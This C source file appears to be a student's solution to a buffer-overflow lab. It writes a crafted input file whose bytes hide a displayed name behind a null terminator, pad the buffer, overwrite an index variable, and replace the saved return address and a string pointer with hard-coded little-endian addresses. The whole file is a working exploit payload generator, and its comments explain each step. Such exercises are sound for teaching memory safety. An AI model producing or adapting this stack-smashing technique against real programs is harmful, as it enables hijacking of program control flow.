#include <stdio.h>
#include <stdlib.h>

int main(void){
	int i;
	FILE *file = fopen("data6", "w");


	if (file == NULL){
		fprintf(stderr, "couldnt crete the file: data6");
		exit(-1);
	}

	/*place the name i want to display
	 *in the start of the buff*/
	fputc('G', file); 
	fputc('e', file);	
	fputc('o', file);	
	fputc('r', file);	
	fputc('g', file);	
	fputc('e', file);	

	/*null terimator after the name we want
	 *to display so the printf stops threre
	 *effectively hiding everything we put after.*/ 
	fputc(0x0, file);

	/*filling the rest of the buff*/
	for(i = 0; i < 23; i++){
		fputc('i',file); 
	}

	/*fill the veriabel c*/
	for(i = 0; i < 4; i++){
		fputc('i',file);
	}

	/*fill i with the intex to go 
         go to the return address*/
	fputc(0x32, file);

	/*fill the return address(8049e8e)*/
	/*the address must be given in little endiant format*/
	fputc(0x8e, file);
	fputc(0x9e, file);
	fputc(0x04, file);
	fputc(0x08, file);

	/*reajust the s to point at the Name(80e42dc)*/
	/*the address must be given in little endiant format*/
	fputc(0xdc, file);
	fputc(0x42, file);
	fputc(0x0e, file);
	fputc(0x08, file);

	fclose(file);

	return 0;
}

